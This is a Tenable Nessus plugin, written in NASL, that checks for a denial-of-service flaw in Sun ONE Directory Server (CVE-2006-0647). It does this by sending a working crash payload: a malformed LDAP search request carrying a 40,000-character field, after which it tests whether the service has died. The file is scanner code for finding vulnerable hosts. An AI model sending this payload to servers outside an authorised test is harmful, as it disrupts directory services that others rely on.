#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(20888);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-0647");
  script_bugtraq_id(16550);
  script_osvdb_id(22996);

  script_name(english:"Sun ONE Directory Server LDAP Malformed Packet DoS");
  script_summary(english:"Checks for denial of service vulnerability in Sun ONE Directory Server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote LDAP server is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Sun ONE Directory Server, an
LDAP directory from Sun. 

The version of Sun ONE Directory Server fails to handle certain
malformed search requests.  A user can leverage this issue to crash
not just the LDAP server but also the entire application on the remote
host." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/dailydave/2006/q1/128" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Sun ONE Directory Server 5.2patch5." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/08");
 script_set_attribute(attribute:"patch_publication_date", value: "2006/05/19");
 script_cvs_date("$Date: 2016/11/03 20:40:06 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 2571);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc: "ldap", default: 2571, exit_on_fail: 1);


# A bad request.
req = 
  raw_string(
    0x30,                              # universal sequence
    0x82, 0x9c, 0x78,                  # length of the request
    0x02, 0x01, 0x01,                  # message id (1)
    0x63,                              # search request
    0x82, 0x9c, 0x71,                  #   length
    0x04, 0x82, 0x9c, 0x55             #   search term
  ) +
  "dc=" + crap(data:"+", length:40000) + ",dc=example,dc=com" +
  raw_string(
    0x0a, 0x01, 0x02,                  #   scope (subtree)
    0x0a, 0x01, 0x00,                  #   dereference (never)
    0x02, 0x01, 0x00,                  #   size limit (0)
    0x02, 0x01, 0x00,                  #   time limit (0)
    0x01, 0x01, 0x00,                  #   attributes only (false)
    0xa2, 0x05, 0x87, 0x03,            #   filter (!(foo=*))
      "foo", 0x30, 0x00
  );


# Open a socket and send the request.
soc = open_sock_tcp(port);
if (! soc) exit(1);

send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

# If we didn't get anything back, check whether it crashed.
if (res == NULL)
{
    # nb: at least under Windows, the server doesn't crash immediately.
    sleep(5);

    # There's a problem if we can't reconnect.
    if (service_is_dead(port: port) > 0)
    {
      security_warning(port);
      exit(0);
    }
}
